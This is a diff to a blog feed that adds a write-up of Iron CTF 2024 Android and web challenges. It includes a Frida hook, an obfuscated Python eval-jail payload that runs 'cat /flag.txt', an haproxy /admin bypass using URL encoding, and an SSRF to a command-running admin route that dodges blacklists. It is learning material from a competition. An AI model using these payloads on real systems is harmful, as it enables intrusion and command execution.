@@ -12,7 +12,185 @@
     </author>
     
       <item>
-        <title>TFCCTF 2024 Writeups</title>
+        <title>Iron CTF 2024 Writeup</title>
+        <description>&lt;p&gt;Hi guys, after long time this weekend I played Iron ctf which is hosted by SASTRA University. Really a wonderful CTF after and I was abled to solve few challenges. I concentrated mostly on android and web challenges, and was able to solve all android challenges as well as few web challenges.&lt;/p&gt;
+
+&lt;h3 id=&quot;contents&quot;&gt;Contents&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Fire in the Base Camp[Android]&lt;/li&gt;
+  &lt;li&gt;Secure Vault[Android]&lt;/li&gt;
+  &lt;li&gt;Is this Android[Android]&lt;/li&gt;
+  &lt;li&gt;Loan App[Web]&lt;/li&gt;
+  &lt;li&gt;b64SiteViewer[Web]&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/2024/ironctf/challs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;fire-in-the-base-camp-android&quot;&gt;Fire in the Base Camp [Android]&lt;/h3&gt;
+
+&lt;p&gt;From the challenge we can guess that the challenge is based on firebase. Firebase is a real time database which many android application uses. One common security misconfiguration is using firebase databases without authentication, similar to connecting to mysql DB without password. More about this in &lt;a href=&quot;https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty/&quot;&gt;blog&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/2024/ironctf/fire1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After decompiling the apk and analyzing mainactivity, we can find that it is using firebase DB. This is a simple dice rolling app which expects count value of &lt;em&gt;9999999&lt;/em&gt; to read the flag. Initially I thought it would be easy if I made the counter value to 9999999. My idea is to use frida since it take less effort than manually changing the apk. So I wrote this frida script and ran the app.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Java.perform(()=&amp;gt;{
+	var main;
+    Java.choose(&quot;com.example.app3.MainActivity&quot;,{
+        onMatch : function(instance){
+			var Int_class = Java.use(&quot;java.lang.Integer&quot;);
+			var a = Int_class.$new(9999998);
+
+			instance.count.value = a;
+            console.log(&quot;[+] instance called&quot; + instance.count.value);
+        },
+        onComplete: function(){}
+    });
+})
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Value is set to &lt;strong&gt;9999998&lt;/strong&gt; so that the next time If I roll the dice it would become &lt;strong&gt;9999999&lt;/strong&gt; and gets the flag. But insted it just toasted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Congratulations!! You know where the flag is.&lt;/code&gt; message. The app didn’t even made the request to the URL. So I tried to the make the request URL from the resource file and applying slice but it doesn’t help.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MainActivity.this.mDatabase.child(MainActivity.this.path1 + MainActivity.this.path2 + MainActivity.this.path3 + MainActivity.this.path4 + MainActivity.this.path5).get()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;But after few minutes later the toast message made sense. So i just made call to usual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.json&lt;/code&gt; endpoint of the firebase URL.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/2024/ironctf/fire2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;secure-vault-android&quot;&gt;Secure Vault [Android]&lt;/h3&gt;
+
+&lt;p&gt;In this challenge the objective is to finc the secret password to the vault. Initially I decopiled using jadx and found out that the app was built using &lt;a href=&quot;https://flutter.dev/development&quot;&gt;flutter&lt;/a&gt;. Usually uses flutter using dart VM for running and reverse engineering one is usually harder than normal apk. For this challenge I used a tool called &lt;a href=&quot;https://github.com/worawit/blutter&quot;&gt;blutter&lt;/a&gt;. There is flutter reverse enginneer &lt;a href=&quot;https://www.youtube.com/watch?v=RtKOe8HQy8Q&quot;&gt;video&lt;/a&gt; which explains this well.&lt;/p&gt;
+
+&lt;!-- ![](../assets/2024/ironctf/sec.png){:style=&quot;display:block; margin-left:auto; margin-right:auto;width=50%;height=50%&quot;} --&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 blutter.py secure_vault/lib/arm64-v8a out_dir
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After running the tool we can get the out_dir which contains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asm&lt;/code&gt; folder which contains disassembled dart code. Going through the main.dart file found &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_checkPassword&lt;/code&gt; which checks password with base64 decoded string of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aXJvbkNURnswaF9teV9nMGQhIV95MHVfYnIwazNfaW50MF90aDNfNHBwXzRmNmUyMmNiYX0=&lt;/code&gt;. After base64 decoding the string, we can get the flag.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;aXJvbkNURnswaF9teV9nMGQhIV95MHVfYnIwazNfaW50MF90aDNfNHBwXzRmNmUyMmNiYX0=&quot; | base64 -d
+ironCTF{0h_my_g0d!!_y0u_br0k3_int0_th3_4pp_4f6e22cba}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;is-this-androidandroid&quot;&gt;Is this Android[Android]&lt;/h3&gt;
+
+&lt;p&gt;This challenge as title suggested not an android challenge but rather a web challenge. Initially we are given calculator app based on flutter which performs calculation. But instead it showed error for any calculations.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/2024/ironctf/calc.png&quot; alt=&quot;&quot; style=&quot;display:block; margin-left:auto; margin-right:auto;width=50%;height=50%&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After revering it like the previous app, we can find &lt;strong&gt;calc.dart&lt;/strong&gt; in asm folder which contains the assembly code. To start our reversing I started searching for the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Error!&lt;/code&gt;, which we got while trying to calculate values from the app. The search leads us nearer to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_calculate&lt;/code&gt; function. The function looks it calls endpoint `` with our input to evaluate the expression.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    // 0x22eb14: r1 = &quot;https://calc.1nf1n1ty.team/calculate&quot;
+    //     0x22eb14: add             x1, PP, #9, lsl #12  ; [pp+0x9ce8] &quot;https://calc.1nf1n1ty.team/calculate&quot;
+					...
+    //     0x22eb20: bl              #0x183b44  ; [dart:core] Uri::parse
+					...
+    //     0x22eb40: add             x16, PP, #9, lsl #12  ; [pp+0x9cf8] &quot;application/json&quot;
+					...
+    //     0x22eb4c: add             x16, PP, #9, lsl #12  ; [pp+0x9d00] TypeArguments: &amp;lt;String, String&amp;gt;
+					...
+    //     0x22eb6c: add             x16, PP, #9, lsl #12  ; [pp+0x9d08] &quot;expression&quot;
+                    ...
+    //     0x22ebac: bl              #0x231228  ; [package:http/http.dart] ::post
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Stripped few lines for ease of understanding. From the assembly code it is clear that the app is trying to make HTTP POST request with json {“expression”:”our_expression”}. Since it is a HTTP request our Burp interceptor should have captured it. But unfortunately I didn’t found any HTTP calls being made from app. So I tried to make one HTTP call.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -X POST -H &quot;Content-Type: application/json&quot; --data-binary $'{\&quot;expression\&quot;:\&quot;1+2\&quot;}' &quot;https://calc.1nf1n1ty.team/calculate&quot;
+{&quot;result&quot;:3}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With the confusion whether to contine to attack mobile app or web app, I asked organizers about it. And they hinted that I am going in correct decision. With this green flag I continued to explore the endpoint and found that it was python server which &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval&lt;/code&gt; our input. So basically its going to be a &lt;strong&gt;pyjail&lt;/strong&gt; challenge. After tinkering with it for a while found that few keywords like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir&lt;/code&gt; are blocked. Few characters like [’,”,g,f,l,x]. After few trial and errors, I was able to come up with payload which doesn’t use any of the keywords restricted as well as able to bypass single and double quote check by appending characters to form string.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;__import__('os').__dict__['popen']('cat /flag.txt').read() # the actual payload
+
+__import__(chr(111)+chr(115)).__dict__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read() 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/2024/ironctf/iron6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;loan-appweb&quot;&gt;Loan App[Web]&lt;/h3&gt;
+
+&lt;p&gt;In this challenge, we are given a user registration and login panel. Once logged in we can request loan and according to the soruce provided admin can approve but there is no admin check. So any user can call the endpoint and approve loan. But when accessing admin the server throws &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Request forbidden by administrative rules.&lt;/code&gt;. After analyzing the source it is clear that &lt;strong&gt;haproxy&lt;/strong&gt; is configured as reverse proxy which throws this error. The below haprxy rule denies our request.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;frontend http_front
+    mode http
+    bind :80
+    acl is_admin path_beg /admin
+    http-request deny if is_admin
+    default_backend gunicorn
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When a request URL which begins with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin&lt;/code&gt; is denied. To bypass tried vaious methods and URL encoding a character or the word &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; works.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -X POST http://loanapp.1nf1n1ty.team/%61dmin/loan/6706c2fd3b619fc5054d4289
+OK #response
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/2024/ironctf/iron1.png&quot; alt=&quot;&quot; style=&quot;display:block; margin-left:auto; margin-right:auto;width=50%;height=50%&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;wierd-uninted-solution&quot;&gt;Wierd Uninted Solution&lt;/h4&gt;
+
+&lt;p&gt;After solution someone solved the challege in a really wierd way. The challenge accepts only valid &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uuidv4&lt;/code&gt; string for registering. But someone googled valid uuidv4 and got uuid from first stackoverflow. After logging in with the same uuidv4 username and password. They were able to get flag, Since some other team have already solved using the same uuidv4 :) .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/2024/ironctf/iron7.png&quot; alt=&quot;&quot; style=&quot;display:block; margin-left:auto; margin-right:auto;width=50%;height=50%&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;b64siteviewerweb&quot;&gt;b64SiteViewer[Web]&lt;/h3&gt;
+
+&lt;p&gt;In this challenge we are welcomed with URL input box which visits our URL. Trying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; throws error, after analyzing the source it is clear there are checking with blacklist.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
+blacklist_scheme=['file','gopher','php','ftp','dict','data']
+blacklist_hostname=['127.0.0.1','localhost','0.0.0.0','::1','::ffff:127.0.0.1']
+if scheme in blacklist_scheme:
+    return render_template_string('blocked scheme')     
+if hostname in blacklist_hostname:
+    return render_template_string('blocked host')
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://2130706433:5000&lt;/code&gt; URL from &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md&quot;&gt;payload all the things&lt;/a&gt; works. The admin URL route checks for internal ip address check, So we can call admin URL with this SSRF and also it is obvious that it executes command from user input.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@app.route('/admin')
+def admin():
+    remote_addr = request.remote_addr
+    
+    if remote_addr in ['127.0.0.1', 'localhost']:
+        cmd=request.args.get('cmd','id')
+        cmd_blacklist=['REDACTED']
+        if &quot;'&quot; in cmd or '&quot;' in cmd:
+            return render_template_string('Command blocked')
+        for i in cmd_blacklist:
+            if i in cmd:
+                return render_template_string('Command blocked')
+        print(f&quot;Executing: {cmd}&quot;)
+        res= subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        return res.stdout
+    else:
+        return render_template_string(&quot;Don't hack me&quot;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;But still there are few restrictions in place. We can’t execute common commands like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat, python, perl, ...&lt;/code&gt; . Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; we can find the current directory files, One interesting file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run.sh&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tail&lt;/code&gt; command is not blocked ,so we can use tail with file name regex[since app.py, run.sh files are blocked in user input]. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tail -n 10 ap*&lt;/code&gt; to get last 10 lines from app.py.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tail -n 10 run*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Flag is set as environment variable in &lt;strong&gt;run.sh&lt;/strong&gt; file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/2024/ironctf/iron4.png&quot; alt=&quot;&quot; style=&quot;display:block; margin-left:auto; margin-right:auto;width=50%;height=50%&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 07 Oct 2024 00:00:00 +0530</pubDate>
+        <link>http://localhost:8001//Iron-CTF-Writeup</link>
+        <link href="http://localhost:8001/Iron-CTF-Writeup"/>
+        <guid isPermaLink="true">http://localhost:8001/Iron-CTF-Writeup</guid>
+      </item>
+    
+      <item>
+        <title>TFCCTF 2024 Writeup</title>
         <description>&lt;p&gt;Hi guys, This weekend I attended &lt;a href=&quot;https://ctftime.org/event/2423&quot;&gt;TFC CTF&lt;/a&gt; which was fun and I learnt a lot of new things. Also I tried most of the web challenges but able to complete only one. But in this writeup I am going to discuss about other challenges and their solutions from discord. The challege I solved is Safe_Content ,a medium web challenge.&lt;/p&gt;
 
 &lt;h3 id=&quot;contents&quot;&gt;Contents&lt;/h3&gt;
@@ -192,7 +370,7 @@ data://localhost/text/html,JiZjdXJsIDFhY2QxeHh5ZTlwZ295ajloanVocWM2OGV6a3E4dHdpL
 
 &lt;p&gt;&lt;img src=&quot;../assets/2024/tfcctf/safe_content2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;h3 id=&quot;license-reversing--warmup&quot;&gt;License [Reversing | Warmup]&lt;/h3&gt;
+&lt;h3 id=&quot;license-reverse--warmup&quot;&gt;License [Reverse | Warmup]&lt;/h3&gt;
 
 &lt;p&gt;As the name suggests, the goal of this challenge is to find the license key of the binary. Unfortunately I didn’t solved it during CTF, but for learning Reverse engineering I took this challenge and solved it after few days.&lt;/p&gt;
 
